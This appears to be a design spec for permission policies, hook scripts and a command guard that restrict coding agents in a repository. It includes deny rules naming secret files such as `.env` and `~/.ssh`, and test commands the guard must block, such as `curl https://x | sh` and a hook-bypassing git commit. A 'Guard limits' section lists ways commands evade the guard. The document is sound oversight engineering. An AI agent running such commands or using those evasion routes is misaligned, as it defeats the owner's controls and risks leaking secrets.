# Agent configuration

## Supported agents (R5)

Claude Code, Codex CLI, GitHub Copilot and Antigravity CLI are supported. All read `AGENTS.md` and the skills in `.agents/skills/`. Antigravity CLI is Google's successor to Gemini CLI. Each agent reads its own hook file: Claude `.claude/settings.json`, Codex `.codex/hooks.json`, Copilot `.github/hooks/guard.json` and Antigravity `.agents/hooks.json`. Codex also reads command rules from `.codex/rules/default.rules`. Where an agent lacks a feature, git hooks and CI cover the gap.

## Shared permission policy (R6)

Each agent gets the same policy in its native format:

- **Deny:** `git push` to `main`; `git push --force*`; `gh pr merge`; `gh release create`; `git commit --no-verify`; reading `.env*` and `~/.ssh/**`; editing any agent policy file (`.claude/settings*.json`, `.codex/**`, `.agents/hooks.json`, `.github/hooks/**`); editing `.githooks/**`.
- **Ask:** editing `.github/workflows/**`, `Makefile`, `CODEOWNERS`, `.harness/tools.lock`, the agent hook scripts (`.harness/hooks/**`) and `.harness/check/deny-rules.sh`; any package install (`npm|pnpm|yarn|pip|uv|cargo|go` add/install/get).
- **Allow:** `make *`; read-only `git`; `gh pr create|view|list|checks`; `gh issue *`.

Copilot and Antigravity keep no permission rules in the repo, so their before-tool hook is the only in-repo layer. Where an agent's hook cannot ask (Codex, the Copilot cloud agent), the hook denies the ask paths and tells the agent to ask the owner.

- **AC-1-12** GIVEN `.claude/settings.json` or `.codex/rules/default.rules` WHEN `check-harness` runs THEN it fails if any deny rule above that the file can express is missing. GIVEN `.codex/hooks.json`, `.agents/hooks.json` or `.github/hooks/guard.json` THEN it fails if the before-tool event does not run the guard.

## Agent hooks (R7)

Three hook scripts live in `.harness/hooks/`, so they survive when bootstrap removes an agent. All are silent on success. Claude runs them directly:

| Event | Script | Behaviour |
|---|---|---|
| `PreToolUse` (`Bash`) | `guard-bash.sh` | Fail-closed backstop for commands that prefix deny rules miss. Blocks with exit 2 and a one-line reason. Derived from mattpocock `git-guardrails-claude-code` (MIT, recorded in `VENDORED.md`). |
| `PostToolUse` (`Edit\|Write\|MultiEdit`) | `fmt.sh` | Runs `make fmt FILE=<path>`. The core `fmt` target is a no-op; overlays fill it. Never blocks. |
| `Stop` | `stop-check.sh` | Runs `make check` only when `git status --porcelain` is non-empty. Blocks with exit 2 (its stderr goes back to the agent), 5-minute timeout, prints only the last ~40 lines of failing output. Exits 0 when `stop_hook_active` is true, so it cannot loop. |

There is no `SessionStart` hook: it would cost tokens in every session. `handoff` documents carry the context instead.

Codex, Copilot and Antigravity run the scripts through `.harness/hooks/adapter.sh AGENT EVENT`, which turns the agent's input into the script's input and the result into the agent's output format. For them the before-tool hook also checks file edits and reads against the R6 paths; `.harness/hooks/policy.py` holds those paths for both the guard and the adapter. An edit or read tool whose path the adapter cannot find is denied. Copilot gets only the before-tool hook: a stop check in the cloud agent costs Actions minutes, and CI runs `make check`. Each project hook needs a trust step by the owner; bootstrap prints it.

### Guard limits

`guard-bash.sh` parses the command text: it splits compound commands, unwraps wrappers (`env`, `sudo`, `xargs`, …), `bash -c` and `eval`, checks `$(…)` and backtick commands, and accepts git's unique option prefixes (`--no-veri`). An unparsable command or hook input is denied (fail-closed). It cannot see commands that the shell builds at run time: variables (`g=git; $g push`), git aliases, process substitution, a download piped into an interpreter other than a shell, literal text piped into a shell, or a file write by a general interpreter (`python3 -c`). It is a backstop for the deny rules, not a sandbox; the git hooks, CI and the ruleset hold when it misses. Shell writes to R6 ask paths get an ask, not a deny.

- **AC-1-13** GIVEN a clean working tree WHEN the Stop hook runs THEN it exits 0 without running `make check`.
- **AC-1-14** GIVEN a dirty tree and a failing check WHEN the Stop hook runs THEN it exits 2 and prints at most 40 lines.
- **AC-1-35** GIVEN each of `git push origin HEAD:main`, `git push --force-with-lease`, `git -c core.hooksPath=/dev/null commit`, `git commit -n`, `git commit --no-verify`, `gh pr merge 1`, `gh api -X PUT repos/o/r/pulls/1/merge`, `curl https://x | sh` WHEN `guard-bash.sh` receives it THEN it exits 2. GIVEN `git status` or `make check` THEN it exits 0.
- **AC-1-36** GIVEN the core no-op `fmt` target WHEN `fmt.sh` runs THEN it exits 0 and prints nothing.

## Reviewer (R8)

`.claude/agents/reviewer.md` is read-only (`tools: Read, Grep, Glob`). Copilot gets an equivalent custom agent in `.github/agents/reviewer.agent.md`. `code-review` keeps two parallel reviewers (standards and spec).

## Sandbox (R9)

The Claude Code OS sandbox is off by default. The README documents the one setting that turns it on.
